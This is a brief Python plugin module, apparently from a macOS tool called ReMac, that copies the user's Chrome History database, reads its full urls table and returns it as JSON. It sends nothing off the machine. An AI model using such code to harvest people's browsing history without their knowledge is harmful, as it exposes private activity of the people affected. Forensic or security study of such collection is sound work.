# from modInterface import ReMacModInterface
import shutil
import sqlite3
import json
import os
from os.path import expanduser
from modules.mod_interface import mod_interface

class mod_chrome_history(mod_interface):
    # def __init__(self):
    #     self.setup_mod()

    def setup_mod(self):
        print(f'Module Setup (mod_chrome_history) called successfully!')
        pass

    def run_mod(self):
        shutil.copy2(expanduser("~") + '/Library/Application Support/Google/Chrome/Default/History', 'chrome_hist')

        con = sqlite3.connect('chrome_hist')
        cur = con.cursor()
        query_result = cur.execute('SELECT * FROM urls')
        data = cur.fetchall()
        # for row in query_result:
        #     print(row)

        cur.close()
        con.close()
        os.remove('chrome_hist')
        return json.dumps(data)